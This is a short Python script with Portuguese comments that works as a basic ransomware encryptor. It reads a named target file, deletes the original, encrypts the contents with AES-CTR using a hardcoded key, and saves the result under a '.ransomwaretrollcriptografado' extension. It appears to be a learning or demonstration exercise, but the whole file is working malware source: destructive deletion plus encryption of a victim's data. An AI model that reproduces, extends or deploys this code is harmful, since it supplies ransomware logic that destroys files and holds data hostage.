## bibliotecas do python necessarias para acessar recursos do SO e de criptografia
import os
import pyaes

## abrindo o arquivo a ser criptografado
file_name = "ArquivoAlvo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## removendo o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo
crypto_data = aes.encrypt(file_data)

## salvando o arquivo criptografado
new_file = file_name + ".ransomwaretrollcriptografado"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
